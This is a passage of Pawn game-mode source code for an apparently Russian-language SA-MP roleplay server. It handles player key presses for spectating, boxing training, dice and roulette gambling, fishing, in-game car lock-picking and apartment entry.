				DisableEnableReconButton(playerid, ReconSelect[playerid], 1);
			}
			else
			{
				ReconSelect[playerid]++;
				DisableEnableReconButton(playerid, ReconSelect[playerid], 1);
			}
			return 1;
		}
		else
		{
			DisableEnableReconButton(playerid, ReconSelectSub[playerid], 0);
			if(ReconSelectSub[playerid] >= ReconBounds[playerid][1])
			{
				ReconSelectSub[playerid] = ReconBounds[playerid][0];
				DisableEnableReconButton(playerid, ReconSelectSub[playerid], 1);
			}
			else
			{
				ReconSelectSub[playerid]++;
				DisableEnableReconButton(playerid, ReconSelectSub[playerid], 1);
			}
		}
	}
	if(Spectate[playerid] && SpecAd[playerid] != INVALID_PLAYER_ID) return PlayerTextDrawShow(playerid, ReconPlayer[34]);
	return true;
}
publics: FixHour(hour)
{
	hour = timeshift+hour;
	if (hour < 0) hour = hour+24;
	else if (hour > 23) hour = hour-24;
	shifthour = hour;
	return true;
}
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	if(newkeys & KEY_SECONDARY_ATTACK && Spectate[playerid])
	{
		DisableEnableReconButton(playerid, ReconSelect[playerid], 0);
		return SelectTextDraw(playerid, 0xD97700AA);
	}
	if(newkeys & KEY_HANDBRAKE && newkeys & KEY_SECONDARY_ATTACK )
	{
		if(PlayerToPoint(2.5,playerid,768.5205,-2.8860,1000.7214) || PlayerToPoint(2.5,playerid,769.8723,14.4393,1000.6978))
		{
			if(Flood[playerid] > 0) return true;
			if(training[playerid] == 1 && PlayerInfo[playerid][pBoxSkill] < 1000)
			{
				PlayerInfo[playerid][pBoxSkill] += 1;
				format(string,90, "~g~NEED: ~w~%d / 1000",PlayerInfo[playerid][pBoxSkill]);
				GameTextForPlayer(playerid, string, 2000, 3);
				return true;
			}
			else if(training[playerid] == 1 && PlayerInfo[playerid][pBoxSkill] > 999) return training[playerid] = 2;
			else if(training[playerid] == 2) return SCM(playerid,COLOR_GREEN," Вы готовы к бою! Найдите соперника и тренера, который устроит вам поединок."),SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING),Flood[playerid] = 4;
			else if(training[playerid] == 3 && PlayerInfo[playerid][pKickboxSkill] < 1000)
			{
				PlayerInfo[playerid][pKickboxSkill] += 1;
				format(string,90, "~g~NEED: ~w~%d / 1000",PlayerInfo[playerid][pKickboxSkill]);
				GameTextForPlayer(playerid, string, 2000, 3);
				return true;
			}
			else if(training[playerid] == 3 && PlayerInfo[playerid][pKickboxSkill] > 999) return training[playerid] = 4;
			else if(training[playerid] == 4) return SCM(playerid,COLOR_GREEN," Вы готовы к бою! Найдите соперника и тренера, который устроит вам поединок."),SetPlayerFightingStyle (playerid, FIGHT_STYLE_KNEEHEAD),Flood[playerid] = 4;
			else if(training[playerid] == 5 && PlayerInfo[playerid][pKongfuSkill] < 1000)
			{
				PlayerInfo[playerid][pKongfuSkill] += 1;
				format(string,90, "~g~NEED: ~w~%d / 1000",PlayerInfo[playerid][pKongfuSkill]);
				GameTextForPlayer(playerid, string, 2000, 3);
				return true;
			}
			else if(training[playerid] == 5 && PlayerInfo[playerid][pKongfuSkill] > 999) return PlayerInfo[playerid][pTraining] = 5;
			else if(PlayerInfo[playerid][pTraining] == 5) return SCM(playerid,COLOR_GREEN," Вы готовы к бою! Найдите соперника и тренера, который устроит вам поединок."),SetPlayerFightingStyle (playerid, FIGHT_STYLE_KUNGFU),Flood[playerid] = 4;
		}
	}
	if(newkeys == 65536)
	{
		if(KostiName[playerid] < 999)
		{
			new dice = random(6)+1;
			new dice1 = random(6)+1;
			format(YCMDstr,sizeof(YCMDstr), " %s и %s бросили кости. Результат: {CC9900}%i:%i",Name(KostiName[playerid]),Name(playerid),dice,dice1);
			ProxDetector(30.0, playerid,YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			if(dice > dice1)
			{
				PlayerInfo[KostiName[playerid]][pCash] += KostiMoney[playerid]/100*90;
				PlayerInfo[playerid][pCash] -= KostiMoney[playerid];
				BizzInfo[4][bTill] += KostiMoney[playerid]*2/100*5;
				format(YCMDstr, sizeof(YCMDstr), " Поздравляем, Вы выиграли! Вы получаете %d от суммы ставки",KostiMoney[playerid]/100*90);
				SCM(KostiName[playerid], COLOR_GREEN, YCMDstr);
				SCM(playerid, COLOR_ORANGE, " К сожалению, Вы проиграли!");
				format(YCMDstr, sizeof(YCMDstr), "~g~+%d$", KostiMoney[playerid]);
				GameTextForPlayer(KostiName[playerid], YCMDstr, 3000, 1);
				format(YCMDstr, sizeof(YCMDstr), "~r~-%d$", KostiMoney[playerid]);
				GameTextForPlayer(playerid, YCMDstr, 3000, 1);
				format(string,sizeof(string), "Выпало: %i",dice1);
				SetPlayerChatBubble(playerid,string,COLOR_ORANGE,30.0,10000);
				format(string,sizeof(string), "Выпало: %i",dice);
				SetPlayerChatBubble(KostiName[playerid],string,TEAM_GROVE_COLOR,30.0,10000);
				ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,1,0,0,1,1);
				SetPlayerAttachedObject(playerid, 1, 1851, 1, 0.062400, 0.453750, 0.000000, 0.000000, 94.689310, 0.000000);
				ApplyAnimation(KostiName[playerid],"CARRY","crry_prtial",4.1,1,0,0,1,1);
				SetPlayerAttachedObject(KostiName[playerid], 1, 1851, 1, 0.062400, 0.453750, 0.000000, 0.000000, 94.689310, 0.000000);
				SetTimer("DiceOff", 5000, 0);
				OpustitRuki[playerid] = 1;
				OpustitRuki[KostiName[playerid]] = 1;
				dicetime = gettime() + 5;
				ZapretDice[playerid] = 0;
				ZapretDice[KostiName[playerid]] = 0;
				KostiMoney[playerid] = 0;
				KostiName[playerid] = 999;
			}
			if(dice < dice1)
			{
				PlayerInfo[KostiName[playerid]][pCash] -= KostiMoney[playerid];
				PlayerInfo[playerid][pCash] += KostiMoney[playerid]/100*90;
				BizzInfo[4][bTill] += KostiMoney[playerid]*2/100*5;
				format(YCMDstr, sizeof(YCMDstr), " Поздравляем, Вы выиграли! Вы получаете %d от суммы ставки",KostiMoney[playerid]/100*90);
				SCM(playerid, COLOR_GREEN, YCMDstr);
				SCM(KostiName[playerid], COLOR_ORANGE, " К сожалению, Вы проиграли!");
				format(YCMDstr, sizeof(YCMDstr), "~g~+%d$", KostiMoney[playerid]);
				GameTextForPlayer(playerid, YCMDstr, 3000, 1);
				format(YCMDstr, sizeof(YCMDstr), "~r~-%d$", KostiMoney[playerid]);
				GameTextForPlayer(KostiName[playerid], YCMDstr, 3000, 1);
				format(string,sizeof(string), "Выпало: %i",dice1);
				SetPlayerChatBubble(playerid,string,TEAM_GROVE_COLOR,30.0,10000);
				format(string,sizeof(string), "Выпало: %i",dice);
				SetPlayerChatBubble(KostiName[playerid],string,COLOR_ORANGE,30.0,10000);
				ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,1,0,0,1,1);
				SetPlayerAttachedObject(playerid, 1 , 1851, 1, 0.062397, 0.453746, 0.000000, 0.000000, 94.689308, 0.000000);
				ApplyAnimation(KostiName[playerid],"CARRY","crry_prtial",4.1,1,0,0,1,1);
				SetPlayerAttachedObject(KostiName[playerid], 1, 1851, 1, 0.062400, 0.453750, 0.000000, 0.000000, 94.689310, 0.000000);
				SetTimer("DiceOff", 5000, 0);
				OpustitRuki[playerid] = 1;
				OpustitRuki[KostiName[playerid]] = 1;
				dicetime = gettime() + 5;
				ZapretDice[playerid] = 0;
				ZapretDice[KostiName[playerid]] = 0;
				KostiMoney[playerid] = 0;
				KostiName[playerid] = 999;
			}
			else if(dice == dice1)
			{
				SCM(playerid, COLOR_ORANGE, " Игра закончилась в ничью!");
				SCM(KostiName[playerid], COLOR_ORANGE, " Игра закончилась в ничью!");
				format(string,sizeof(string), "Выпало: %i",dice1);
				SetPlayerChatBubble(playerid,string,COLOR_LIGHTBLUE,30.0,10000);
				format(string,sizeof(string), "Выпало: %i",dice);
				SetPlayerChatBubble(KostiName[playerid],string,COLOR_LIGHTBLUE,30.0,10000);
				ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,1,0,0,1,1);
				SetPlayerAttachedObject(playerid, 1 , 1851, 1, 0.062397, 0.453746, 0.000000, 0.000000, 94.689308, 0.000000);
				ApplyAnimation(KostiName[playerid],"CARRY","crry_prtial",4.1,1,0,0,1,1);
				SetPlayerAttachedObject(KostiName[playerid], 1, 1851, 1, 0.062400, 0.453750, 0.000000, 0.000000, 94.689310, 0.000000);
				SetTimer("DiceOff", 5000, 0);
				OpustitRuki[playerid] = 1;
				OpustitRuki[KostiName[playerid]] = 1;
				dicetime = gettime() + 5;
				ZapretDice[playerid] = 0;
				ZapretDice[KostiName[playerid]] = 0;
				KostiMoney[playerid] = 0;
				KostiName[playerid] = 999;
			}
		}
		else
		{
			return true;
		}
		return true;
	}
	if(Works[playerid])
	{
		if(JobCP[playerid] == 2 && usemesh[playerid] == 1)
		{
			if(newkeys & KEY_JUMP || newkeys & KEY_FIRE || newkeys & KEY_SECONDARY_ATTACK)  // при нажатии выполняется действие
			{
				SCM(playerid, COLOR_LIGHTRED, " Вы уронили мешок");
				DisablePlayerCheckpoint(playerid);
				ApplyAnimation(playerid, "CARRY", "crry_prtial",4.0,0,0,0,0,1,0);
				mesh[playerid] = 0;
				usemesh[playerid] = 0;
				if(IsPlayerAttachedObjectSlotUsed(playerid,1)) RemovePlayerAttachedObject(playerid,1);
				SetPlayerCheckpoint(playerid,2230.3528,-2286.1353,14.3751,1.5);
				JobCP[playerid] = 1;
			}
		}
	}
	if(GetPVarInt(playerid, "matovoz_rob"))
	{
		if(newkeys & KEY_JUMP || newkeys & KEY_FIRE || newkeys & KEY_SECONDARY_ATTACK)  // при нажатии выполняется действие
		{
			SCM(playerid, COLOR_LIGHTRED, " Вы уронили ящик");
			DisablePlayerCheckpoint(playerid);
			ApplyAnimation(playerid, "CARRY", "crry_prtial",4.0,0,0,0,0,1,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid,1)) RemovePlayerAttachedObject(playerid,1);
			DeletePVar(playerid, "matovoz_rob");
			MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad] += 250;
			format(string, sizeof(string), "Кол-во груза\n%i", MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad]);
        	UpdateDynamic3DTextLabelText(Rob3DText, 0xEDEA9FAA, string);
		}
	}
	if(newkeys == 131072)
	{
		if(KostiName[playerid] != 999)
		{
			KostiMoney[playerid] = 0;
			SendMes(playerid, COLOR_ORANGE, " Вы отказались играть в кости с %s",PlayerInfo[KostiName[playerid]][pName]);
			SendMes(KostiName[playerid], COLOR_ORANGE, " %s отказался играть с вами в кости",PlayerInfo[playerid][pName]);
			ZapretDice[playerid] = 0;
			ZapretDice[KostiName[playerid]] = 0;
			KostiMoney[playerid] = 0;
			KostiName[playerid] = 999;
		}
	}
	if(newkeys & KEY_SPRINT && Spectate[playerid])
	{
		PlayerPlaySound(playerid, 1084, 0.0, 0.0, 0.0);
		if(ReconSelectSub[playerid] == INVALID_TEXT_DRAW) OnPlayerClickPlayerTextDraw(playerid, ReconPlayer[ReconSelect[playerid]]);
		else OnPlayerClickPlayerTextDraw(playerid, ReconPlayer[ReconSelectSub[playerid]]);
		return 1;
	}
	if(PRESSED(8))
	{
		if(avtocar[playerid] != 0 && GetNearestVehicle(playerid) == avtocar[playerid])
		{
			if(IsPlayerInAnyVehicle(playerid)) return 1;
			GetVehicleParamsEx(avtocar[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
			if(doors == 0) return SCM(playerid,COLOR_GREY," Замок автомобиля уже открыт!");
			ApplyAnimation(playerid,"BD_FIRE","wash_up",4.1,1,1,1,1,0);
			timervzlom[playerid] = SetTimerEx("Ugon", 20000, 0, "i", playerid);
			idcarv[playerid] = avtocar[playerid];
			nachalvzlom[playerid] = 1;
			SCM(playerid,COLOR_BLUE," Вы пытаетесь взломать замок автомобиля (( Не отпускайте клавишу 20 секунд )) ");
		}
	}
	else if (RELEASED(8))
	{
		if(IsPlayerInAnyVehicle(playerid)) return 1;
		if(nachalvzlom[playerid] == 0) return 1;
		idcarv[playerid] = 0;
		KillTimer(timervzlom[playerid]);
		ClearAnimations(playerid);
		nachalvzlom[playerid] = 0;
	}
	if(newkeys == KEY_CROUCH)
	{
		if(PlayerToPoint(3.0,playerid,-2438.7942,524.3234,29.6306))
		{
			if (GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -2501.9170,524.2781,491.5463);
				SetPlayerPos(tmpcar, -2501.9170,524.2781,491.5463);
				SetVehicleZAngle(tmpcar, 273.4404);
				TelePos[playerid][0] = 0.0;
				TelePos[playerid][1] = 0.0;
			}
		}
		else if(PlayerToPoint(3.0,playerid,-2500.6748,534.4558,491.7077))
		{
			new tmpcar = GetPlayerVehicleID(playerid);
			SetVehiclePos(tmpcar, -2443.1113,524.0466,29.6310);
			SetPlayerPos(tmpcar, -2443.1113,524.0466,29.6310);
			SetVehicleZAngle(tmpcar, 180.2442);
			TelePos[playerid][0] = 0.0;
			TelePos[playerid][1] = 0.0;
		}
		else if(IsPlayerNearGarage(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER && IsPlayerInVehicle(playerid, house_car[playerid]))
		{
			CallLocalFunction("OnPlayerCommandText", "is", playerid, "/enterg");
		}
	}
	if(newkeys & 16)
	{
		if(SERIU[playerid][sID] != INVALID_PLAYER_ID)
		{
			SelectTextDraw(playerid, 0xFF9933FF);
		}
	}
	if(newkeys == 4 && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && GetPlayerWeapon(playerid) == 17)
	{
	    new Float:fX, Float:fY, Float:fZ;
	    GetPlayerPos(playerid, fX, fY, fZ);
		if((PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2) && GetPVarInt(playerid, "Fraction_Duty") == 1)
  		{
		    foreach(i)
		    {
	            if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i, 10.0, fX, fY, fZ) && (!IsACop(i) || GetPVarInt(i, "Fraction_Duty") == 0))
	            {
					PlayerCuffed[playerid] = 1;
 					PlayerCuffedTime[playerid] = 10;
 					GameTextForPlayer(i,"~r~freeze", 5000, 3);
					ApplyAnimation(i, "ped", "gas_cwr", 4.1, 0, 1, 1, 1, 0, 1);
					TogglePlayerControllable(i, false);
					SetTimerEx("UnFreeze" , 10000, false, "i", i);
					//GameTextForPlayer(i,"~g~unfreeze", 10000, 3);
					SetCameraBehindPlayer(i);
	            }
		    }
	    }
	}
	if(newkeys == 1024)
	{
		if(/*IsAtFishPlace(playerid) > 0 && */GetPVarInt(playerid,"fish_began"))
		{
			switch(GetPVarInt(playerid,"fish_ready"))
			{
			case 0:
				{
					if(Flood[playerid]) return true;
					if(!GetPVarInt(playerid,"fish_gear")) return SCM(playerid,0x81DA99AA,"У вас нет снастей");
					else
					{
						ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 6.1, 0, 0, 0, 0, 0,1);
						SCM(playerid,0x81DA99AA,"Вы оснастили удочку");
						SetPVarInt(playerid,"fish_gear",GetPVarInt(playerid,"fish_gear")-1);
						SetPVarInt(playerid,"fish_ready",1);
						UpdateFish(playerid);
						Flood[playerid] = 1;
					}
				}
			case 1:
				{
					if(Flood[playerid]) return true;
					if(!GetPVarInt(playerid,"fish_worms")) return SCM(playerid,0x81DA99AA,"У вас нет червей");
					else
					{
						ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 6.1, 0, 0, 0, 0, 0,1);
						SCM(playerid,0x81DA99AA,"Вы наживили червя");
						SetPVarInt(playerid,"fish_worms",GetPVarInt(playerid,"fish_worms")-1);
						SetPVarInt(playerid,"fish_ready",2);
						UpdateFish(playerid);
						Flood[playerid] = 1;
					}
				}
			case 2:
				{
					if(Flood[playerid]) return true;
					SetPVarInt(playerid,"fish_time", gettime() + 3);
					ApplyAnimation(playerid,"SWORD","sword_IDLE",50.0,0,1,1,1,1);
					SetPVarInt(playerid,"fish_ready",3);
					SetPVarInt(playerid,"fish_chanse",99);
					SCM(playerid,0x81DA99AA,"Вы закинули удочку. Следите за поплавком, когда он опустится - подсекайте");
					GameTextForPlayer(playerid,"~b~!",4000,6);
					UpdateFish(playerid);
					Flood[playerid] = 1;
				}
			case 3:
				{
					new kg, info = random(10);
					if(GetPVarInt(playerid,"fish_chanse") < 3)
					{
						ClearAnimations(playerid);
						DeletePVar(playerid,"fish_chanse");
						SetPVarInt(playerid,"fish_ready",1);
						ApplyAnimation(playerid,"SWORD","sword_part",50.0,0,0,0,0,0);
						if(info == 1) return SCM(playerid,0x81DA99AA,"Рыба сорвалась");
						switch(GetPVarInt(playerid,"fish_chanse"))
						{
						case 0:
							{
								ApplyAnimation(playerid,"SWORD","sword_part",50.0,0,0,0,0,0);
								kg = 0;
								GameTextForPlayer(playerid,"~g~~n~!", 100, 6);
							}
						case 1:
							{
								ApplyAnimation(playerid,"SWORD","sword_part",50.0,0,0,0,0,0);
								if(info == 2) return SCM(playerid,0x81DA99AA,"Рыба сорвалась и оборвала снасти"), SetPVarInt(playerid,"fish_ready",0);
								kg = 10;
								GameTextForPlayer(playerid,"~n~~n~~y~!", 100, 6);
							}
						case 2:
							{
								ApplyAnimation(playerid,"SWORD","sword_part",50.0,0,0,0,0,0);
								if(info == 2) return SCM(playerid,0x81DA99AA,"Рыба сорвалась и оборвала снасти"), SetPVarInt(playerid,"fish_ready",0);
								kg = 20;
								GameTextForPlayer(playerid,"~n~~n~~r~~n~!", 100, 6);
							}
						}
						ApplyAnimation(playerid,"SWORD","sword_part",50.0,0,0,0,0,0);
						format(YCMDstr,24,"%i.%i",random(40)+kg,random(99));
						new Float:kg_ = floatstr(YCMDstr);
						SendMes(playerid,0x81DA99AA," Вы поймали %s весом %.2f кг",FishNames[random(18)],kg_);
						PlayerInfo[playerid][pFishes]+=kg_;
						Sonar[IsAtFishPlace(playerid)]-=kg_;
						if(Sonar[IsAtFishPlace(playerid)] < 0) Sonar[IsAtFishPlace(playerid)] = 0;
						UpdateFish(playerid);
						if(PlayerInfo[playerid][pFishLic] < 1 && PlayerInfo[playerid][pWantedLevel] < 6)
						{
							PlayerInfo[playerid][pWantedLevel] += 1;
							PlayerInfo[playerid][pZakonp] -= 1;
							SetPlayerWantedLevel(playerid,PlayerInfo[playerid][pWantedLevel]);
							SetPlayerCriminal(playerid,"Неизвестный", "Нелегальная рыбалка");
						}
					}
					else if(!Flood[playerid]) SCM(playerid,0x81DA99AA,"Вы ничего не поймали");ApplyAnimation(playerid,"SWORD","sword_part",50.0,0,0,0,0,0);
				}
			}
		}
	}
	if(newkeys == 1024)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3,2283.0381,-1137.9327,1050.8984)) return ShowPlayerDialogEx(playerid, 8003, 2, "Меню квартиры","Купить комнату\nПродать комнату\nКвартплата\nДверной замок\nАптечка\nСменить интерьер\nИнформация","Выбор","Закрыть");
		else if(IsPlayerInRangeOfPoint(playerid, 3,54.8790,-79.7394,1004.2859)) return ShowPlayerDialogEx(playerid, 8003, 2, "Меню квартиры","Купить комнату\nПродать комнату\nКвартплата\nДверной замок\nАптечка\nСменить интерьер\nИнформация","Выбор","Закрыть");
		else if(IsPlayerInRangeOfPoint(playerid, 3,34.9120,-81.2602,1004.2859)) return ShowPlayerDialogEx(playerid, 8003, 2, "Меню квартиры","Купить комнату\nПродать комнату\nКвартплата\nДверной замок\nАптечка\nСменить интерьер\nИнформация","Выбор","Закрыть");
		else
		{
			for(new i = 1; i <= TotalHouse; i++)
			{
				if(!PlayerToPoint(3, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz])) continue;
				ShowPlayerDialogEx(playerid, 6700, 2, "Меню дома","Купить дом\nПродать дом\nДверной замок\nАптечка\nСменить интерьер\nИнформация","Готово","Отмена");
				break;
			}
		}
	}
	if(newkeys == 4)
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			CallLocalFunction("OnPlayerCommandText", "is", playerid, "/lights");
		}
	}
	if(newkeys == KEY_SECONDARY_ATTACK)
	{
		CallLocalFunction("OnPlayerCommandText", "is", playerid, "/exit");
		for(new i = 1; i <= ALLKVARTIRI; i++)
		{
			new x = GetPlayerVirtualWorld(playerid);
			if(IsPlayerInRangeOfPoint(playerid, 2, kvartinfo[i][pXpic],kvartinfo[i][pYpic],kvartinfo[i][pZpic]) && kvartinfo[i][kworld] == GetPlayerVirtualWorld(playerid))
			{
				KGet(playerid);
				if(kvartinfo[i][lock]   ==  1 && PlayerInfo[playerid][pKvartiraKey] != i)return SCM(playerid, COLOR_GRAD1, "Квартира закрыта. У вас нет ключей");
				if(kvartinfo[i][kInt] == 0)
				{
					SetPlayerPos(playerid,2283.3474,-1139.2313,1050.8984);
					SetPlayerInterior(playerid,11);
					SetPlayerVirtualWorld(playerid, i);
					return true;
				}
				else if(kvartinfo[i][kInt] == 1)
				{
					SetPlayerPos(playerid,31.3584,-84.8000,1004.2859);
					SetPlayerInterior(playerid,15);
					SetPlayerVirtualWorld(playerid, i);
					return true;
				}
				else if(kvartinfo[i][kInt] == 2)
				{
					SetPlayerPos(playerid,58.2073,-79.1497,1004.2859);
					SetPlayerInterior(playerid,15);
					SetPlayerVirtualWorld(playerid, i);
					return true;
				}
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3, 2283.3474,-1139.2313,1050.8984) && kvartinfo[x][kCena] == 100000)
			{
				SetPlayerPos(playerid,    kvartinfo[x][pXpic],kvartinfo[x][pYpic],kvartinfo[x][pZpic]);
				SetPlayerInterior(playerid,15);
				SetPlayerVirtualWorld(playerid, kvartinfo[x][kworld]);
				return true;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3, 2283.3474,-1139.2313,1050.8984) && kvartinfo[x][kCena] != 100000)
			{
				SetPlayerPos(playerid,    kvartinfo[x][pXpic],kvartinfo[x][pYpic],kvartinfo[x][pZpic]);
				SetPlayerInterior(playerid,1);
				SetPlayerVirtualWorld(playerid, kvartinfo[x][kworld]);
				return true;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3, 34.9105,-81.2279,1004.2859) && kvartinfo[x][kCena] == 100000)
			{
				SetPlayerPos(playerid,    kvartinfo[x][pXpic],kvartinfo[x][pYpic],kvartinfo[x][pZpic]);
				SetPlayerInterior(playerid,15);
				SetPlayerVirtualWorld(playerid, kvartinfo[x][kworld]);
				return true;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3, 34.9105,-81.2279,1004.2859) && kvartinfo[x][kCena] != 100000)
			{
				SetPlayerPos(playerid,    kvartinfo[x][pXpic],kvartinfo[x][pYpic],kvartinfo[x][pZpic]);
				SetPlayerInterior(playerid,1);
				SetPlayerVirtualWorld(playerid, kvartinfo[x][kworld]);
				return true;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3, 54.8791,-79.6500,1004.2859) && kvartinfo[x][kCena] == 100000)
			{
				SetPlayerPos(playerid,    kvartinfo[x][pXpic],kvartinfo[x][pYpic],kvartinfo[x][pZpic]);
				SetPlayerInterior(playerid,15);
				SetPlayerVirtualWorld(playerid, kvartinfo[x][kworld]);
				return true;
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3, 54.8791,-79.6500,1004.2859) && kvartinfo[x][kCena] != 100000)
			{
				SetPlayerPos(playerid,    kvartinfo[x][pXpic],kvartinfo[x][pYpic],kvartinfo[x][pZpic]);
				SetPlayerInterior(playerid,1);
				SetPlayerVirtualWorld(playerid, kvartinfo[x][kworld]);
				return true;
			}
		}
	}
	if(newkeys == KEY_SPRINT)
	{
		if(GetPVarInt(playerid,"RStol") && !GetPVarInt(playerid,"RStavka") && !RouletPlay[GetPVarInt(playerid,"RStol")]) {
			switch(GetPVarInt(playerid,"RStol"))
			{
			case 1,5,12: ShowPlayerDialogEx(playerid,5576,DIALOG_STYLE_INPUT,"Ставка","Минимальная ставка: 500 вирт\nМаксимальняа ставка: 5000 вирт\nВведите сумму:","Играть","Закрыть");
			case 2,7,10: ShowPlayerDialogEx(playerid,5576,DIALOG_STYLE_INPUT,"Ставка","Минимальная ставка: 2000 вирт\nМаксимальняа ставка: 20000 вирт\nВведите сумму:","Играть","Закрыть");
			case 3,8,11: ShowPlayerDialogEx(playerid,5576,DIALOG_STYLE_INPUT,"Ставка","Минимальная ставка: 5000 вирт\nМаксимальняа ставка: 50000 вирт\nВведите сумму:","Играть","Закрыть");
			case 4,6,9: ShowPlayerDialogEx(playerid,5576,DIALOG_STYLE_INPUT,"Ставка","Минимальная ставка: 10000 вирт\nМаксимальняа ставка: 100000 вирт\nВведите сумму:","Играть","Закрыть");
			} }
	}
	if(newkeys == 16)
	{
		if(GetRoulet(playerid))
		{
			if(GetPVarInt(playerid,"RStol")) return ShowPlayerDialogEx(playerid,5490,DIALOG_STYLE_MSGBOX,"Рулетка: Выход","Вы действительно хотите выйти из-за стола?","Выход","Отмена");
			if(GetPVarInt(playerid,"CasinoRank") > 0) return SCM(playerid,COLOR_GREY," Крупье не может играть!");
			new null = 0;
			foreach(i) if(GetPVarInt(i,"RStol") == GetRoulet(playerid)) null++;
			if(null > 4) return SCM(playerid,COLOR_GREY," За этим столом нет свободных мест!");
			switch(GetRoulet(playerid))
			{
			case 1: SetPVarFloat(playerid,"RX",1962.96), SetPVarFloat(playerid,"RY",1026.88), SetPVarFloat(playerid,"RZ",992.33);
			case 2: SetPVarFloat(playerid,"RX",1958.36), SetPVarFloat(playerid,"RY",1026.88), SetPVarFloat(playerid,"RZ",992.33);
			case 3: SetPVarFloat(playerid,"RX",1958.36), SetPVarFloat(playerid,"RY",1008.88), SetPVarFloat(playerid,"RZ",992.33);
			case 4: SetPVarFloat(playerid,"RX",1962.96), SetPVarFloat(playerid,"RY",1008.88), SetPVarFloat(playerid,"RZ",992.33);

			case 5: SetPVarFloat(playerid,"RX",2230.31), SetPVarFloat(playerid,"RY",1619.56), SetPVarFloat(playerid,"RZ",1006.06);
			case 6: SetPVarFloat(playerid,"RX",2241.89), SetPVarFloat(playerid,"RY",1619.56), SetPVarFloat(playerid,"RZ",1006.06);
			case 7: SetPVarFloat(playerid,"RX",2230.31), SetPVarFloat(playerid,"RY",1613.56), SetPVarFloat(playerid,"RZ",1006.06);
			case 8: SetPVarFloat(playerid,"RX",2241.89), SetPVarFloat(playerid,"RY",1613.56), SetPVarFloat(playerid,"RZ",1006.06);

			case 9: SetPVarFloat(playerid,"RX",2230.31), SetPVarFloat(playerid,"RY",1594.56), SetPVarFloat(playerid,"RZ",1006.06);
			case 10: SetPVarFloat(playerid,"RX",2241.89), SetPVarFloat(playerid,"RY",1594.56), SetPVarFloat(playerid,"RZ",1006.06);
			case 11: SetPVarFloat(playerid,"RX",2230.31), SetPVarFloat(playerid,"RY",1588.56), SetPVarFloat(playerid,"RZ",1006.06);
			case 12: SetPVarFloat(playerid,"RX",2241.89), SetPVarFloat(playerid,"RY",1588.56), SetPVarFloat(playerid,"RZ",1006.06);
			}
			new Float:pos[6];
			GetPlayerPos(playerid,pos[0],pos[1],pos[2]);
			SetPVarInt(playerid,"RStavka",0);
			SetPVarInt(playerid,"RStol",GetRoulet(playerid));
			SetPVarFloat(playerid,"RXONE",GetPVarFloat(playerid,"RX"));
			SetPVarFloat(playerid,"RYONE",GetPVarFloat(playerid,"RY"));
			SetPVarFloat(playerid,"RZONE",GetPVarFloat(playerid,"RZ"));
			SetPVarFloat(playerid,"RNumber",0);
			new obj = CreateObject(random(5) + 1912,GetPVarFloat(playerid,"RX"),GetPVarFloat(playerid,"RY"),GetPVarFloat(playerid,"RZ"),0.00,0.00,0.00);
			SetPVarInt(playerid,"RObj",obj);
			GetObjectPos(obj, pos[3], pos[4], pos[5]);
			SetPlayerCameraPos(playerid,pos[0],pos[1],pos[2]+0.8);
			SetPlayerCameraLookAt(playerid,pos[3],pos[4],pos[5]);
			SCM(playerid,0xc175ffaa," Игра начата. Сделайте ставку");
			TogglePlayerControllableEx(playerid, 0);
			PlayerTextDrawShow(playerid,RouletText[playerid]);
			return PlayerTextDrawSetString(playerid,RouletText[playerid],"~<~~>~~up~~down~~n~~g~Money: none~n~~y~Bet: none");
		}
		else if(IsPlayerNearBone(playerid) != -1)
		{
			new null = -1;
			for(new i = 0; i != 5; i++) if(BoneInfo[IsPlayerNearBone(playerid)][Gamer][i] == INVALID_PLAYER_ID) { null = i; break; }
			if(GetPVarInt(playerid,"CasinoRank") && BoneInfo[IsPlayerNearBone(playerid)][Crupie] != INVALID_PLAYER_ID) return SCM(playerid,COLOR_GREY," Тут уже работает крупье!");
			if(GetPVarInt(playerid,"BoneStol")) return SCM(playerid,COLOR_GREY," Ты уже зарегистрирован на другом столе!");
			if(null == -1 && !GetPVarInt(playerid,"CasinoRank")) return SCM(playerid,COLOR_GREY," За этим столом нет свободных мест!");
			if(!GetPVarInt(playerid,"CasinoRank")) BoneInfo[IsPlayerNearBone(playerid)][Gamer][null] = playerid;
			else BoneInfo[IsPlayerNearBone(playerid)][Crupie] = playerid;
			for(new i; i != 4; i++) TextDrawShowForPlayer(playerid,Bone[i]), PlayerTextDrawShow(playerid,PlayerBone[playerid][i]);
			SetPVarInt(playerid,"BoneStol",IsPlayerNearBone(playerid)+1);
			SelectTextDraw(playerid,0x33AAFFFF);
			return UpdateBone(IsPlayerNearBone(playerid));
		}
	}
	if( (newkeys & KEY_FIRE) || ( (newkeys & KEY_AIM) && (oldkeys & KEY_AIM) && (newkeys & KEY_SECONDARY_ATTACK) ) )
	{
		if(IsAArm(playerid) || IsACop(playerid) || IsAMayor(playerid) || PlayerInfo[playerid][pAdmin] > 1) return true;
		if(!IsAAntidm(playerid)) return true;
		if(IsPlayerInAnyVehicle(playerid)) return true;
